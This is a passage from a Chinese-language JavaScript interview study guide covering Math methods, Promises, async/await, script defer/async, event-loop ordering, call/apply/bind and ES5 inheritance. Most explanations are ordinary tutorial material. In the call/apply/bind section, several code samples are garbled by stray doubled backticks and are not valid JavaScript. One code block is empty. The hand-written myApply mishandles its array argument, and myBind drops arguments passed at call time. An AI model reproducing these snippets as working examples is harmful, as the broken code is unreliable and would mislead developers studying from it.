3. 使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。

### 27、Math

#### Math 对象方法

| 方法                                                         | 描述                                                         |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [abs(x)](https://www.runoob.com/jsref/jsref-abs.html)        | 返回 x 的绝对值。                                            |
| [acos(x)](https://www.runoob.com/jsref/jsref-acos.html)      | 返回 x 的反余弦值。                                          |
| [asin(x)](https://www.runoob.com/jsref/jsref-asin.html)      | 返回 x 的反正弦值。                                          |
| [atan(x)](https://www.runoob.com/jsref/jsref-atan.html)      | 以介于 -PI/2 与 PI/2 弧度之间的数值来返回 x 的反正切值。     |
| [atan2(y,x)](https://www.runoob.com/jsref/jsref-atan2.html)  | 返回从 x 轴到点 (x,y) 的角度（介于 -PI/2 与 PI/2 弧度之间）。 |
| [ceil(x)](https://www.runoob.com/jsref/jsref-ceil.html)      | 对数进行上舍入。                                             |
| [cos(x)](https://www.runoob.com/jsref/jsref-cos.html)        | 返回数的余弦。                                               |
| [exp(x)](https://www.runoob.com/jsref/jsref-exp.html)        | 返回 Ex 的指数。                                             |
| [floor(x)](https://www.runoob.com/jsref/jsref-floor.html)    | 对 x 进行下舍入。                                            |
| [log(x)](https://www.runoob.com/jsref/jsref-log.html)        | 返回数的自然对数（底为e）。                                  |
| [max(x,y,z,...,n)](https://www.runoob.com/jsref/jsref-max.html) | 返回 x,y,z,...,n 中的最高值。                                |
| [min(x,y,z,...,n)](https://www.runoob.com/jsref/jsref-min.html) | 返回 x,y,z,...,n中的最低值。                                 |
| [pow(x,y)](https://www.runoob.com/jsref/jsref-pow.html)      | 返回 x 的 y 次幂。                                           |
| [random()](https://www.runoob.com/jsref/jsref-random.html)   | 返回 0 ~ 1 之间的随机数。                                    |
| [round(x)](https://www.runoob.com/jsref/jsref-round.html)    | 四舍五入。                                                   |
| [sin(x)](https://www.runoob.com/jsref/jsref-sin.html)        | 返回数的正弦。                                               |
| [sqrt(x)](https://www.runoob.com/jsref/jsref-sqrt.html)      | 返回数的平方根。                                             |
| [tan(x)](https://www.runoob.com/jsref/jsref-tan.html)        | 返回角的正切。                                               |



```js
Math.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)
```



题目：

```js
var min = Math.min();
var max = Math.max();
console.log(min < max);
// 写出执行结果，并解释原因
```

**答案**
false

**解析**

- 按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false
- MDN 相关文档是这样解释的
  - Math.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。
  - 而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false

###  28、promise和 async await 区别

**参考答案：**

- **概念**
  **Promise** 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的

  **async await**也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。

- ##### 两者的区别

  1. Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。
  2. async await与Promise一样，是非阻塞的。
  3. async await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。

### 29、 defer和async区别

**参考答案：**

区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个

**解析：**

在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后

```html
<script src="script.js"></script>
```

async：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。
但是多个js文件的加载顺序不会按照书写顺序进行

```html
<script async src="script.js"></script>
```

derer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。

```html
<script defer src="script.js"></script>
```



### 30、同步和异步

**参考答案：**

同步

- 指在 **主线程**上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。
- 也就是调用一旦开始，必须这个调用 **返回结果**(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。

异步

- 异步任务是指不进入主线程，而进入 **任务队列**的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。
- 每一个任务有一个或多个 **回调函数**。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。
- 程序的执行顺序和任务的排列顺序是**不一致**的，异步的。
- 我们常用的setTimeout和setInterval函数，Ajax都是异步操作。



### 31、 实现异步的方法

**参考答案：**

回调函数（Callback）、事件监听、发布订阅、Promise/A+、生成器Generators/ yield、async/await

1. JS 异步编程进化史：callback -> promise -> generator -> async + await

2. async/await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。

3. async/await可以说是异步终极解决方案了。

   (1) async/await函数相对于Promise，优势体现在：

   - 处理 then 的调用链，能够更清晰准确的写出代码
   - 并且也能优雅地解决回调地狱问题。

   当然async/await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。

   (2) async/await函数对 Generator 函数的改进，体现在以下三点：

   - 内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，**async 函数的执行，与普通函数一模一样，只要一行**。
   - 更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 **async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）**。
   - 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。



1. async/await

   Async/Await简介

    使用async/await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：

    1. async/await是基于Promise实现的，它不能用于普通的回调函数。

    2. async/await与Promise一样，是非阻塞的。

   ```
     3. async/await使得异步代码看起来像同步代码，这正是它的魔力所在。
   ```

   **一个函数如果加上 async ，那么该函数就会返回一个 Promise**

   ```js
   async function async1() {
     return "1"
   }
   console.log(async1()) // -> Promise {<resolved>: "1"}
   ```

   Generator函数依次调用三个文件那个例子用async/await写法，只需几句话便可实现

   ```js
   let fs = require('fs')
   function read(file) {
     return new Promise(function(resolve, reject) {
       fs.readFile(file, 'utf8', function(err, data) {
         if (err) reject(err)
         resolve(data)
       })
     })
   }
   async function readResult(params) {
     try {
       let p1 = await read(params, 'utf8')//await后面跟的是一个Promise实例
       let p2 = await read(p1, 'utf8')
       let p3 = await read(p2, 'utf8')
       console.log('p1', p1)
       console.log('p2', p2)
       console.log('p3', p3)
       return p3
     } catch (error) {
       console.log(error)
     }
   }
   readResult('1.txt').then( // async函数返回的也是个promise
     data => {
       console.log(data)
     },
     err => console.log(err)
   )
   // p1 2.txt
   // p2 3.txt
   // p3 结束
   // 结束
   ```

5.2 Async/Await并发请求

如果请求两个文件，毫无关系，可以通过并发请求

```js
   let fs = require('fs')
   function read(file) {
     return new Promise(function(resolve, reject) {
       fs.readFile(file, 'utf8', function(err, data) {
         if (err) reject(err)
         resolve(data)
       })
     })
   }
   function readAll() {
     read1()
     read2()//这个函数同步执行
   }
   async function read1() {
     let r = await read('1.txt','utf8')
     console.log(r)
   }
   async function read2() {
     let r = await read('2.txt','utf8')
     console.log(r)
   }
   readAll() // 2.txt 3.txt
```





### 32、 promise的介绍与使用

**Promise 介绍：**

ES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。

Promise对象, 可以**将异步操作以同步的流程表达出来**。使用 Promise 主要有以下好处：

- 可以很好地解决**回调地狱**的问题（避免了层层嵌套的回调函数）。
- 语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。

**Promise 使用：**

**语法**

```js
var promise = new Promise((resolve, reject) => {/* executor函数 */
    // ... some code
    if (/* 异步操作成功 */){
        resolve(value);
    } else {
        reject(error);
    }
});
promise.then((value) => {
    //success
}, (error) => {
    //failure
})
```

1. 参数
   `executor` 函数在`Promise`构造函数执行时同步执行，被传递 `resolve` 和 `reject` 函数（`executor`函数在`Promise`构造函数返回新建对象前被调用）。
   `executor` 内部通常会执行一些异步操作，一旦完成，可以调用`resolve`函数来将`promise`状态改成`fulfilled`(完成)，或者将`promise`的状态改为`rejected`(失败)。
   如果在`executor`函数中抛出一个错误，那么该`promise` 状态为`rejected`。`executor`函数的返回值被忽略。
2. 简单使用

```jsx
function timeout(ms) {
    return new Promise((resolve, reject) => {
        setTimeout(resolve, ms, 'done');
    });
}

timeout(2000).then((value) => {
    console.log(value); //done
});
```

**原型方法**

Promise.prototype.then(onFulfilled, onRejected)

1. 语法
   `p.then(onFulfilled, onRejected);`
   `p.then((value) => {// fulfillment}, (reason) => {// rejection});`

2. 含义
   为 `Promise`实例添加状态改变时的回调函数。`then`方法的第一个参数是`resolved`状态的回调函数，第二个参数（可选）是`rejected`状态的回调函数。

3. 链式操作
   `then`方法返回的是一个新的`promise`，因此可以采用链式写法，即`then`方法后面再调用另一个`then`方法。

   ```js
   new Promise(resolve => {
       resolve(1);
   })
       .then(result => console.log(result)) //1
       .then(result => {
           console.log(result);              //undefined
           return 2;
       })
       .then(result => {
           console.log(result);             //2
           throw new Error("err");
       })
       .then((result) =>{
           console.log(result);            
       }, (err)=>{
           console.log(err);                //Error: err
           return 3;
       })
       .then((result) => {
           console.log(result);            //3
       })
   ```

   注意：①不管是`then`方法的`onfulfilled`函数参数执行还是`onrejected`（可选参数）函数参数执行，`then`方法返回的都是一个新的`Promise`对象，都可以继续采用链式写法调用另一个`then`方法。②`Promise.prototype.catch()`方法返回的也是一个`Promise`对象。`then`方法和`catch`方法可以链式操作。

4. 返回值
   `then`方法返回一个`Promise`，而它的行为与`then`中的被调用的回调函数(`onfulfilled`函数/`onrejected`函数)的返回值有关。
   (1) 如果`then`中的回调函数返回一个值，那么`then`返回的`Promise`将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       reject();
   })
   .then( () => 99, () => 42 )
   .then( result => console.log(result)); // 42
   ```

   (2) 如果`then`中的回调函数抛出一个错误，那么`then`返回的`Promise`将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
       .then( () => {throw new Error('err')}, () => {})
       .then( () => {}, (err) => {console.log(err)}); //Error: err
   ```

   (3) 如果`then`中的回调函数返回一个已经是接受状态的`Promise`，那么`then`返回的`Promise`也会成为接受状态，并且将那个`Promise`的接受状态的回调函数的参数值作为该被返回的`Promise`的接受状态回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
       .then( () => {
           return new Promise(resolve => resolve('ok'));
       })
       .then( (result) => {console.log(result)}); //ok
   ```

   (4) 如果`then`中的回调函数返回一个已经是拒绝状态的`Promise`，那么`then`返回的`Promise`也会成为拒绝状态，并且将那个`Promise`的拒绝状态的回调函数的参数值作为该被返回的`Promise`的拒绝状态回调函数的参数值。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
       .then( () => {
           return new Promise((resolve, reject) => {
              reject(new Error('err'));
           });
       })
       .then( () => {}, (err) => {console.log(err)}); //Error: err
   ```

   (5) 如果`then`中的回调函数返回一个未定状态（`pending`）的`Promise`，那么`then`返回`Promise`的状态也是未定的，并且它的终态与那个`Promise`的终态相同；同时，它变为终态时调用的回调函数参数与那个`Promise`变为终态时的回调函数的参数是相同的。

   ```js
   new Promise((resolve, reject) => {
       resolve();
   })
   .then(() => {
       return new Promise(resolve => {
           setTimeout(resolve, 2000, 'ok');
       });
   })
   .then( (result) => {console.log(result)}); //ok
   ```

   注意：这里是`then`方法中被调用回调函数的返回值与`then`方法返回的`Promise`对象状态之间的关系。

**Promise.prototype.catch(onRejected)**

1. 语法

   ```js
   p.catch(onRejected);
   
   p.catch(function(reason) {
       // 拒绝
   });
   ```

2. 含义
   `Promise.prototype.catch`方法是`.then(null, rejection)`的别名，用于指定发生错误时的回调函数，返回一个新的`promise`对象。

3. 用法

   ```js
   const p = new Promise((resolve,reject) => {
       return reject(new Error('err')); //reject方法的作用，等同于抛出错误
       //throw new Error('err');
   });
   
   p.then(null, (err) => {
       console.log(err);  //Err: err
   });
   
   //--------等价写法---------
   p.catch(err => {
       console.log(err); //Err: err
   })
   ```

   注意：由于`.catch`方法是`.then(null, rejection)`的别名，故`.then`中的链式操作(3)、返回值(4)等语法在`.catch`中都适用。

4. 一般总是建议，`Promise` 对象后面要跟`catch`方法，这样可以处理 `Promise`内部发生的错误。`catch`方法返回的还是一个 `Promise` 对象，因此后面还可以接着调用`then`方法。

5. `Promise`对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个`catch`语句捕获。 即：当前`catch`方法可以捕获上一个`catch`方法(包括上一个`catch`)到当前`catch`(不包括当前`catch`)方法之间所有的错误，如果没有错误，则当前`catch`方法不执行。

   ```
   new Promise(() => {
       throw new Error('err1');
   })
       .then(() => {console.log(1);})
       .then(() => {console.log(2);})
       .catch((err) => {
           console.log(err); //Err: err1
           throw  new Error('err2');
       })
       .catch((err) => {console.log(err);})//Err: err2
   ```

6. 一般来说，不要在`then`方法里面定义`Reject`状态的回调函数（即`then`的第二个参数），总是使用`catch`方法。

   ```js
   // bad
   new Promise()
       .then((data) => {/* success */ }, (err) => {/* error */ });
   
   // good
   new Promise()
       .then((data) => { /* success */ })
       .catch((err) => {/* error */ });
   ```

   上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面`then`方法执行中的错误，也更接近同步的写法。

7. 与传统的`try/catch`代码块不同的是，即使没有使用`catch`方法指定错误处理的回调函数，`Promise` 对象抛出的错误也不会中止外部脚本运行。

   ```js
   new Promise((resolve) => {
       // 下面一行会报错，因为x没有声明
       resolve(x + 2);
   }).then(() => {
       console.log('ok');
   });
   setTimeout(() => {console.log('over')});
   //Uncaught (in promise) ReferenceError: x is not defined
   //over
   ```

8. 在异步函数中抛出的错误不会被`catch`捕获到

   ```
   new Promise((resolve, reject) => {
       setTimeout(() => {
           throw 'Uncaught Exception!';
       }, 1000);
   }).catch(() => {
       console.log('err'); //不会执行
   });
   
   new Promise((resolve, reject) => {
       setTimeout(() => {
           reject();
       }, 1000);
   }).catch(() => {
       console.log('err'); //err
   });
   ```

9. 在`resolve()`后面抛出的错误会被忽略

   ```js
   new Promise((resolve, reject) => {
       resolve();
       throw 'Silenced Exception!';
   }).catch(function(e) {
       console.log(e); // 不会执行
   });
   ```

**Promise.all(iterable)**

1. 语法
   `var p = Promise.all([p1, p2, p3]);`

2. 含义
   `Promise.all`方法接受一个数组作为参数，`p1`、`p2`、`p3`都是 `Promise` 实例，如果不是，就会先调用下面讲到的`Promise.resolve`方法，将参数转为 `Promise` 实例，再进一步处理。（`Promise.all`方法的参数可以不是数组，但必须具有 `Iterator` 接口，且返回的每个成员都是 `Promise` 实例。）
   `p`的状态由`p1`、`p2`、`p3`决定，分成两种情况。
   (1) 只有`p1`、`p2`、`p3`的状态都变成`fulfilled`，`p`的状态才会变成`fulfilled`，此时`p1`、`p2`、`p3`的返回值组成一个数组，传递给`p`的回调函数。
   (2) 只要`p1`、`p2`、`p3`之中有一个被`rejected`，`p`的状态就变成`rejected`，此时第一个被`reject`的实例的返回值，会传递给`p`的回调函数。

3. 用法

   ```js
   const p1 = 'p1-ok';
   const p2 = Promise.resolve('p2-ok');
   const p3 = new Promise((resolve) => setTimeout(resolve, 3000, 'p3-ok'));
   const p4 = Promise.reject('p4-err');
   Promise.all([p1, p2, p3])
       .then((resolves) => {
         resolves.forEach(resolve => {
             console.log(resolve); //p1-ok   p2-ok  p3-ok
         });
       })
       .catch(() => {
         console.log('err');
       });
   
   Promise.all([p1, p2, p3, p4])
       .then(() => {
         console.log('ok');
       })
       .catch((err) => {
          console.log(err); //p4-err
       })
   ```

**Promise.race(iterable)**

1. 语法
   `var p = Promise.race([p1, p2, p3]);`

2. 含义
   `Promise.race`方法同样是将多个`Promise`实例，包装成一个新的`Promise`实例。只要`p1`、`p2`、`p3`之中有一个实例率先改变状态，`p`的状态就跟着改变。那个率先改变的 `Promise` 实例的返回值，就传递给`p`的回调函数。
   `Promise.race`方法的参数与`Promise.all`方法一样，如果不是 `Promise` 实例，就会先调用下面讲到的`Promise.resolve`方法，将参数转为`Promise`实例，再进一步处理。

3. 用法

   ```js
   var p1 = new Promise(resolve => {setTimeout(resolve, 500, "one");});
   var p2 = new Promise(resolve => {setTimeout(resolve, 100, "two");});
   Promise.race([p1, p2])
       .then(value => {
           console.log(value); // "two"
       });
   
   var p3 = new Promise(resolve => {setTimeout(resolve, 100, "three");});
   var p4 = new Promise((resolve, reject) => {setTimeout(reject, 500, "four");});
   
   Promise.race([p3, p4])
       .then((value) => {
           console.log(value); // "three"
       })
       .catch(err => {
           // 未被调用  
       });
   
   var p5 = new Promise(resolve => {setTimeout(resolve, 500, "five");});
   var p6 = new Promise((resolve, reject) => {
             setTimeout(reject, 100, "six");
         });
   
   Promise.race([p5, p6])
       .then((value) => {
         // 未被调用             
       }).catch((reason) => {
           console.log(reason); // "six"
       });
   ```

**Promise.resolve(value)**

1. 语法

   ```js
   Promise.resolve(value);
   Promise.resolve(promise);
   Promise.resolve(thenable);
   ```

   `Promise.resolve`等价于下面的写法。

   ```js
   Promise.resolve(value) ;
   // 等价于
   new Promise(resolve => resolve(value));
   ```

2. 含义
   返回一个状态由给定`value`决定的`Promise`实例。

3. 用法
   (1) 如果该值是一个`Promise`对象，则直接返回该对象；

   ```js
   const p = new Promise((resolve) => {resolve()});
   const p2 = Promise.resolve(p);
   console.log(p === p2); //true
   ```

   (2) 如果参数是`thenable`对象(即带有`then`方法的对象)，则返回的`Promise`对象的最终状态由`then`方法的执行决定；

   ```js
   const thenable = {
       then(resolve, reject) {
           resolve(42);
       }
   };
   Promise.resolve(thenable)
       .then((value) => {
           console.log(value);  // 42
       });
   ```

   (3) 如果参数是不具有`then`方法的对象或基本数据类型，则返回的`Promise`对象的状态为`fulfilled`，并且将该参数传递给`then`方法。

   ```js
   Promise.resolve('Hello')
       .then((s) => {
           console.log(s); //Hello
       });
   ```

   (4) 如果不带有任何参数，则返回的`Promise`对象的状态为`fulfilled`，并且将`undefined`作为参数传递给`then`方法。

   ```js
   Promise.resolve()
       .then((s) => {
           console.log(s); //undefined
       });
   ```

4. 通常而言，如果你不知道一个值是否是`Promise`对象，使用`Promise.resolve(value)` 来返回一个`Promise`对象,这样就能将该`value`以`Promise`对象形式使用。

5. 立即`resolve`的`Promise`对象，是在本轮“事件循环”（`event loop`）的结束时，而不是在下一轮“事件循环”的开始时。

   ```js
   setTimeout(function () {
       console.log('three');
   }, 0);
   
   Promise.resolve().then( () => {
       console.log('two');
   });
   
   console.log('one');
   // one 
   // two
   // three
   ```

**Promise.reject(reason)**

1. 语法

   ```js
   Promise.reject(reason);
   ```

   `Promise.reject`等价于下面的写法。

   ```js
   var p = Promise.reject(reason);
   // 等同于
   var p = new Promise((resolve, reject) => reject(reason));
   ```

2. 含义
   返回一个状态为`rejected`的`Promise`对象，并将给定的失败信息传递给对应的处理方法。

> **注意：`Promise.resolve(value)`方法返回的`Promise`实例的状态由`value`决定，可能是`fulfilled`，也可能是`rejected`。`Promise.reject(reason)`方法返回的`Promise`实例的状态一定是`rejected`。**

1. 用法

   ```js
   Promise.reject("Testing static reject")
       .then((value) => {
           // 未被调用
       }).catch((reason) => {
           console.log(reason); // Testing static reject
       });
   
   Promise.reject(new Error("fail"))
       .then((value) => {
           // 未被调用
       }).catch((error) => {
           console.log(error); // Error: fail
       });
   ```

2. `Promise.reject()`方法的参数，会原封不动地作为`reject`的理由，变成后续方法的参数。这一点与`Promise.resolve`方法不一致。

   ```js
   const thenable = {
       then(resolve) {
           resolve('ok');
       }
   };
   
   Promise.resolve(thenable)
       .then(e => {
           console.log(e === 'ok'); //true
       });
   
   Promise.reject(thenable)
       .catch(e => {
           console.log(e === thenable); // true
       });
   ```



**与promise.all相反的是哪一个**

**参考答案：**

Promse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。

**扩展：**

语法

```
Promise.race(iterable);
```

参数

- iterable

  可迭代对象，类似`Array`

返回值

 一个**待定的** `Promise`]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而**异步**地解析或拒绝（一旦堆栈为空）



33、promise实现文件读取

```js
// const fs = require("fs");
import fs from "fs";
import path from "path";
const __dirname = path.resolve();
function readFile(file) {
  return new Promise((resolve, reject) => {
    fs.readFile(path.join(__dirname, file), (err, data) => {
      if (data) {
        resolve(data.toString());
      } else {
        reject(err);
      }
    });
  });
}

readFile("./JavaScript/promise/file/file1.txt")
  .then((data) => {
    console.log(data);
    return readFile("./JavaScript/promise/file/file1.txt");
  })
  .then((data) => {
    console.log(data);
  });

```



### 33、用js实现sleep，用promise

```js
function SLeep_p(time) {
  return new Promise((resolve, reject) => {
    setTimeout(resolve, time);
  });
}

SLeep_p(2000).then(() => {
  console.log("kif");
});
```





### 34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.then

```js
console.time('start');

setTimeout(function() {
  console.log(2);
}, 10);

setImmediate(function() {
  console.log(1);
});

new Promise(function(resolve) {
  console.log(3);
  resolve();
  console.log(4);
}).then(function() {
  console.log(5);
  console.timeEnd('start')
});

console.log(6);

process.nextTick(function() {
  console.log(7);
});

console.log(8);
```

**参考答案：**

综合的执行顺序就是： `3——>4——>6——>8——>7——>5——>start: 7.009ms——>1——>2`

**解析：**

本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：

1. 所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)
2. 在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务
3. 一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行
4. 主线程不断重复上面的第三步

在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出`3、4、6、8`。当主线程任务执行完毕后，再从Event Loop中读取任务。

Event Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。

在Job queue中的队列分为两种类型：

`宏任务 Macrotask` 宏任务是指Event Loop在**每个阶段**执行的任务

`微任务 Microtask` 微任务是指Event Loop在**每个阶段之间**执行的任务

我们举例来看执行顺序的规定，我们假设

宏任务队列包含任务: A1, A2 , A3

微任务队列包含任务: B1, B2 , B3

执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。

了解完了`宏任务 Macrotask`和`微任务 Microtask`两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：

宏任务 Macrotask队列真实包含任务：

```
script(主程序代码),setTimeout, setInterval, setImmediate, I/O, UI rendering
```

微任务 Microtask队列真实包含任务：

```
process.nextTick, Promises, Object.observe, MutationObserver
```

由此我们得到的执行顺序应该为：

```
script(主程序代码)—>process.nextTick—>Promises...——>setTimeout——>setInterval——>setImmediate——> I/O——>UI rendering
```

> 在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs

我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的

接下来我们分析我们的题目，首先分析Job queue的执行顺序：

```
script(主程序代码)——>process.nextTick——>promise——>setTimeout——>setImmediate
```

- 主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）
- process.nextTick: 输出7
- promise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd('start')
- setImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时
- setTimeout ： 输出2



### 35、call appy bind的作用和区别

**参考答案：**

作用：

 都可以改变函数内部的this指向。

区别点：

1. call 和 apply 会调用函数，并且改变函数内部this指向。
2. call 和 apply 传递的参数不一样，call 传递参数arg1,arg2...形式 apply 必须数组形式[arg]
3. bind 不会调用函数，可以改变函数内部this指向。

**解析：**

call方法

改变函数内部this指向

call()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。

写法：fun.call(thisArg, arg1, arg3, ...) // thisArg为想要指向的对象，arg1,arg3为参数

call 的主要作用也可以实现继承

```

```

apply方法

apply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。

写法：fun.apply(thisArg, [argsArray])

- thisArg:在fun函数运行时指定的this值
- argsArray:传递的值，必须包含在数组里面
- 返回值就是函数的返回值，因为他就是调用函数

apply的主要应用，比如可以利用apply可以求得数组中最大值

```
const arr = [1, 22, 3, 44, 5, 66, 7, 88, 9];``const max = Math.max.apply(Math, arr);``console.log(max);
```

bind方法

bind()方法不会调用函数，但是能改变函数内部this指向

写法：fun.bind(thisArg, arg1, arg2, ...)

- thisArg:在fun函数运行时指定的this值
- arg1,arg2:传递的其他参数
- 返回由指定的this值和初始化参数改造的原函数拷贝

```
var` `o = {``  ``name: ``"lisa"``};``function` `fn() {``  ``console.log(``this``);``}``var` `f = fn.bind(o);``f();
```

bind应用

如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了

```
const btns = document.querySelectorAll(``"button"``);``for` `(let i = 0; i < btns.length; i++) {``  ``btns[i].onclick = ``function``() {``   ``this``.disabled = ``true``;``   ``setTimeout(``    ``function``() {``     ``this``.disabled = ``false``;``    ``}.bind(``this``),``    ``2000``   ``);``  ``};``}
```

**扩展:**

主要应用场景：

1. call 经常做继承。
2. apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。
3. bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。

#### 手写bind

```js
// bind体验
// 改变this指向

function func(...args) {
    console.log(this)
    console.log(args)
}
// func(1, 2, 3, 4)
// undefined
// [ 1, 2, 3, 4 ]

let Fu = func.bind({ a: 1 }, 1, 2, 3, 4)
// Fu()
// { a: 1 }
// [ 1, 2, 3, 4 ]
let Fu2 = func.bind(1, 1, 2, 3, 4)
// Fu2()
// 1
// [ 1, 2, 3, 4 ]

// bind实现思路：
// 判断是否是函数调用，若非函数调用抛出异常

// 返回函数

// 判断函数的调用方式，是否是被new出来的
// new出来的话，返回空对象，但是实例的 __ proto__ 指向_this的prototype
var age = 16;
var gender = 'female';

var obj = {
    age: 11,
    gender: 'male'
}

function Test(a, b) {
    //   console.log(this.age);
    //   console.log(this.gender);
    console.log(this)
    if (this) {
        console.log(this.age);
        console.log(this.gender);
    }
    console.log(a);
    console.log(b);
}

Test.bind(obj, 3, 7)()

Function.prototype.myBind = function (obj, ...args) {
    obj.fn = this
    let result
    return function () {
        result = obj.fn(...args)
        delete obj.fn
        return result
    }
}
Test.myBind(obj,3,8)()
```

#### 手写call



```js
// 思路
// 判断是否是函数调用，若非函数调用抛异常
// 通过新对象（context）来调用函数
// 给context创建一个fn设置为需要调用的函数
// 结束调用完之后删除fn


// Function.prototype.myCall = function (contents) {
//     //判断是否是函数调用，不是就抛出异常
//     //这里的this 就是调用my_call的
//     if (typeof this !== 'function') {
//         return
//     }
//     // 不传参默认为window
//     contents = contents || window
//     // 保存this
//     contents.fn = this
//     // 获取参数
//     let args = [...arguments].slice(1)
//     let result = contents.fn(...args)
//     delete contents.fn

//     return result

// }
var age = 16;
var gender = 'female';

var obj = {
    age: 11,
    gender: 'male'
}

function Test(a, b) {
    //   console.log(this.age);
    //   console.log(this.gender);
    console.log(this)
    if (this) {
        console.log(this.age);
        console.log(this.gender);
    }
    console.log(a);
    console.log(b);
}
// Test(3, 5);
// Test.call(obj, 22, 33);

Function.prototype.myCall = function (obj, ...args) {
    if (typeof this !== 'function') {
        return
    }
    obj.fn = this
    let result = obj.fn(...args)
    delete obj.fn
    return result
}
Test.myCall(obj,3,6)
```



#### 手写apply

```js
// 思路
// 判断是否是函数调用，若非函数调用抛异常
// 通过新对象（context）来调用函数
// 给context创建一个fn设置为需要调用的函数
// 结束调用完之后删除fn


Function.prototype.myApply = function (context) {
    if (typeof this !== 'function') {
        return
    }
    context = context || window
    context.fn = this
    let args = [...arguments].slice(1)
    let result = context.fn(...args)
    delete context.fn
    return result
}
```



### 36、继承，优缺点

**参考答案：**

- 继承的好处
  - a：提高了代码的复用性
  - b：提高了代码的维护性
  - c：让类与类之间产生了关系，是多态的前提
- 继承的弊端
  - 类的耦合性增强了,但是开发的原则：高内聚，低耦合。





### 37、ES5 js继承的方法和优缺点

**参考答案：**

1. 原型链继承

   实现方式：将子类的原型链指向父类的对象实例

   ```js
   function Parent(){
     this.name = "parent";
     this.list = ['a'];
   }
   Parent.prototype.sayHi = function(){
     console.log('hi');
   }
   function Child(){
   
   }
   Child.prototype = new Parent();
   var child = new Child();
   console.log(child.name);
   child.sayHi();
   ```

